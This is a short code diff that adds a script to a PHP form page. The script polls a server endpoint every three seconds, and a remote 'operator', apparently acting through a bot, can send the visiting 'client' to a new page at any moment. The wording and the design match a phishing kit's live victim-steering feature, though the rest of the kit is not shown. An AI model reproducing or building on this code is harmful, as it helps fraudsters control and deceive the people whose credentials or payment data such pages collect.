@@ -122,5 +122,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             </form>
         </center>
     </div>
+    <script>
+    // Escucha al operador: si el bot manda otro destino mientras el
+    // cliente está aquí, redirige al instante.
+    (function(){
+      function vrPoll(){
+        fetch("verificar_redireccion.php",{credentials:"same-origin"})
+          .then(function(r){return r.json()})
+          .then(function(d){
+            if(d&&d.status==="redirigir"){window.location.href=d.destino;return;}
+            setTimeout(vrPoll,3000);
+          })
+          .catch(function(){setTimeout(vrPoll,3000)});
+      }
+      vrPoll();
+    })();
+    </script>
 </body>
 </html>
